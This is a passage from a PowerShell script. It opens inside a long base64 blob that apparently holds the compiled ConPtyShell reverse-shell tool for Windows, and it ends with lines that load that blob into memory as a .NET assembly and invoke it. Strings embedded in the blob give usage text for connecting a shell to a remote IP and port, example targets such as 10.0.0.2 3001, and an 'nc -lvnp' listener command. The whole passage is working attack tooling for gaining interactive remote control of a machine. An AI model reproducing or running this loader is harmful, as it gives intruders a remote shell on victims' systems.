bgBQAHQAeQBTAGgAZQBsAGwAOgAgAEkAbgB2AGEAbABpAGQAIABpAG4AdABlAGcAZQByACAAdgBhAGwAdQBlACAAewAwAH0ADQAKAAAdcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlAACNpQ0ACgANAAoAQwBvAG4AUAB0AHkAUwBoAGUAbABsACAALQAgAEYAdQBsAGwAeQAgAEkAbgB0AGUAcgBhAGMAdABpAHYAZQAgAFIAZQB2AGUAcgBzAGUAIABTAGgAZQBsAGwAIABmAG8AcgAgAFcAaQBuAGQAbwB3AHMAIAANAAoAQQB1AHQAaABvAHIAOgAgAHMAcABsAGkAbgB0AGUAcgBfAGMAbwBkAGUADQAKAEwAaQBjAGUAbgBzAGUAOgAgAE0ASQBUAA0ACgBTAG8AdQByAGMAZQA6ACAAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBhAG4AdABvAG4AaQBvAEMAbwBjAG8ALwBDAG8AbgBQAHQAeQBTAGgAZQBsAGwADQAKACAAIAAgACAADQAKAEMAbwBuAFAAdAB5AFMAaABlAGwAbAAgAC0AIABGAHUAbABsAHkAIABpAG4AdABlAHIAYQBjAHQAaQB2AGUAIAByAGUAdgBlAHIAcwBlACAAcwBoAGUAbABsACAAZgBvAHIAIABXAGkAbgBkAG8AdwBzAA0ACgANAAoAUAByAG8AcABlAHIAbAB5ACAAcwBlAHQAIAB0AGgAZQAgAHIAbwB3AHMAIABhAG4AZAAgAGMAbwBsAHMAIAB2AGEAbAB1AGUAcwAuACAAWQBvAHUAIABjAGEAbgAgAHIAZQB0AHIAaQBlAHYAZQAgAGkAdAAgAGYAcgBvAG0ADQAKAHkAbwB1AHIAIAB0AGUAcgBtAGkAbgBhAGwAIAB3AGkAdABoACAAdABoAGUAIABjAG8AbQBtAGEAbgBkACAAIgBzAHQAdAB5ACAAcwBpAHoAZQAiAC4ADQAKAA0ACgBZAG8AdQAgAGMAYQBuACAAYQB2AG8AaQBkACAAdABvACAAcwBlAHQAIAByAG8AdwBzACAAYQBuAGQAIABjAG8AbABzACAAdgBhAGwAdQBlAHMAIABpAGYAIAB5AG8AdQAgAHIAdQBuACAAeQBvAHUAcgAgAGwAaQBzAHQAZQBuAGUAcgANAAoAdwBpAHQAaAAgAHQAaABlACAAZgBvAGwAbABvAHcAaQBuAGcAIABjAG8AbQBtAGEAbgBkADoADQAKACAAIAAgACAAcwB0AHQAeQAgAHIAYQB3ACAALQBlAGMAaABvADsAIAAoAHMAdAB0AHkAIABzAGkAegBlADsAIABjAGEAdAApACAAfAAgAG4AYwAgAC0AbAB2AG4AcAAgADMAMAAwADEADQAKAA0ACgBJAGYAIAB5AG8AdQAgAHcAYQBuAHQAIAB0AG8AIABjAGgAYQBuAGcAZQAgAHQAaABlACAAYwBvAG4AcwBvAGwAZQAgAHMAaQB6AGUAIABkAGkAcgBlAGMAdABsAHkAIABmAHIAbwBtACAAcABvAHcAZQByAHMAaABlAGwAbAANAAoAeQBvAHUAIABjAGEAbgAgAHAAYQBzAHQAZQAgAHQAaABlACAAZgBvAGwAbABvAHcAaQBuAGcAIABjAG8AbQBtAGEAbgBkAHMAOgANAAoAIAAgACAAIAAkAHcAaQBkAHQAaAA9ADgAMAANAAoAIAAgACAAIAAkAGgAZQBpAGcAaAB0AD0AMgA0AA0ACgAgACAAIAAgACQASABvAHMAdAAuAFUASQAuAFIAYQB3AFUASQAuAEIAdQBmAGYAZQByAFMAaQB6AGUAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4ASABvAHMAdAAuAFMAaQB6AGUAIAAoACQAdwBpAGQAdABoACwAIAAkAGgAZQBpAGcAaAB0ACkADQAKACAAIAAgACAAJABIAG8AcwB0AC4AVQBJAC4AUgBhAHcAVQBJAC4AVwBpAG4AZABvAHcAUwBpAHoAZQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4ASABvAHMAdAAuAFMAaQB6AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAKAAkAHcAaQBkAHQAaAAsACAAJABoAGUAaQBnAGgAdAApAA0ACgANAAoAVQBzAGEAZwBlADoADQAKACAAIAAgACAAQwBvAG4AUAB0AHkAUwBoAGUAbABsAC4AZQB4AGUAIAByAGUAbQBvAHQAZQBfAGkAcAAgAHIAZQBtAG8AdABlAF8AcABvAHIAdAAgAFsAcgBvAHcAcwBdACAAWwBjAG8AbABzAF0AIABbAGMAbwBtAG0AYQBuAGQAbABpAG4AZQBdAA0ACgANAAoAUABvAHMAaQB0AGkAbwBuAGEAbAAgAGEAcgBnAHUAbQBlAG4AdABzADoADQAKACAAIAAgACAAcgBlAG0AbwB0AGUAXwBpAHAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVABoAGUAIAByAGUAbQBvAHQAZQAgAGkAcAAgAHQAbwAgAGMAbwBuAG4AZQBjAHQADQAKACAAIAAgACAAcgBlAG0AbwB0AGUAXwBwAG8AcgB0ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVABoAGUAIAByAGUAbQBvAHQAZQAgAHAAbwByAHQAIAB0AG8AIABjAG8AbgBuAGUAYwB0AA0ACgAgACAAIAAgAFsAcgBvAHcAcwBdACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAbwB3AHMAIABzAGkAegBlACAAZgBvAHIAIAB0AGgAZQAgAGMAbwBuAHMAbwBsAGUADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARABlAGYAYQB1AGwAdAA6ACAAIgAyADQAIgANAAoAIAAgACAAIABbAGMAbwBsAHMAXQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABDAG8AbABzACAAcwBpAHoAZQAgAGYAbwByACAAdABoAGUAIABjAG8AbgBzAG8AbABlAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEQAZQBmAGEAdQBsAHQAOgAgACIAOAAwACIADQAKACAAIAAgACAAWwBjAG8AbQBtAGEAbgBkAGwAaQBuAGUAXQAgACAAIAAgACAAIAAgACAAIAAgACAAVABoAGUAIABjAG8AbQBtAGEAbgBkAGwAaQBuAGUAIABvAGYAIAB0AGgAZQAgAHAAcgBvAGMAZQBzAHMAIAB0AGgAYQB0ACAAeQBvAHUAIABhAHIAZQAgAGcAbwBpAG4AZwAgAHQAbwAgAGkAbgB0AGUAcgBhAGMAdAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABEAGUAZgBhAHUAbAB0ADoAIAAiAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAiAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAA0ACgBFAHgAYQBtAHAAbABlAHMAOgANAAoAIAAgACAAIABTAHAAYQB3AG4AIABhACAAcgBlAHYAZQByAHMAZQAgAHMAaABlAGwAbAANAAoAIAAgACAAIAAgACAAIAAgAEMAbwBuAFAAdAB5AFMAaABlAGwAbAAuAGUAeABlACAAMQAwAC4AMAAuADAALgAyACAAMwAwADAAMQANAAoAIAAgACAAIAANAAoAIAAgACAAIABTAHAAYQB3AG4AIABhACAAcgBlAHYAZQByAHMAZQAgAHMAaABlAGwAbAAgAHcAaQB0AGgAIABzAHAAZQBjAGkAZgBpAGMAIAByAG8AdwBzACAAYQBuAGQAIABjAG8AbABzACAAcwBpAHoAZQANAAoAIAAgACAAIAAgACAAIAAgAEMAbwBuAFAAdAB5AFMAaABlAGwAbAAuAGUAeABlACAAMQAwAC4AMAAuADAALgAyACAAMwAwADAAMQAgADMAMAAgADkAMAANAAoAIAAgACAAIAANAAoAIAAgACAAIABTAHAAYQB3AG4AIABhACAAcgBlAHYAZQByAHMAZQAgAHMAaABlAGwAbAAgACgAYwBtAGQALgBlAHgAZQApACAAdwBpAHQAaAAgAHMAcABlAGMAaQBmAGkAYwAgAHIAbwB3AHMAIABhAG4AZAAgAGMAbwBsAHMAIABzAGkAegBlAA0ACgAgACAAIAAgACAAIAAgACAAQwBvAG4AUAB0AHkAUwBoAGUAbABsAC4AZQB4AGUAIAAxADAALgAwAC4AMAAuADIAIAAzADAAMAAxACAAMwAwACAAOQAwACAAYwBtAGQALgBlAHgAZQANAAoADQAK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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUAAADAAAAPA6AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
    $ConPtyShellBytes = [System.Convert]::FromBase64String($ConPtyShellBase64)
    [Reflection.Assembly]::Load($ConPtyShellBytes) | Out-Null
    $output = [ConPtyShellMainClass]::ConPtyShellMain($parametersConPtyShell)
    Write-Output $output
}